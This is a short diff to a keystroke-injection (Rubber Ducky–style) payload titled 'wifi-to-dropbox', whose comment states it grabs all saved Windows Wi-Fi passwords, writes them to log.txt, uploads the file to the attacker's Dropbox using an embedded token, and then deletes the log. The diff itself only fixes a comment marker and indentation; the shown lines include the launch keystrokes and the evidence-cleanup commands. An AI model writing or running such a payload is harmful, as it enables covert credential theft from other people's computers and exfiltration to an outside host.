@@ -1,4 +1,4 @@
-# ph3llin's wifi-to-dropbox 
+REM ph3llin's wifi-to-dropbox 
 REM GRABS ALL WIFI PASSWORDS ON WINDOWS CREATES log.txt ON DESKTOP THEN UPLOADS TO YOUR DROPBOX MUST EDIT DROP BOX TOKEN BELOW
 DELAY 2000
 GUI R
@@ -34,7 +34,7 @@ DELAY 100
 REM bottom code with delete log.txt and exit powershell
 STRING cd $env:USERPROFILE\Desktop
 ENTER
- DELAY 100
+DELAY 100
 STRING del log.txt
 ENTER
 DELAY 100
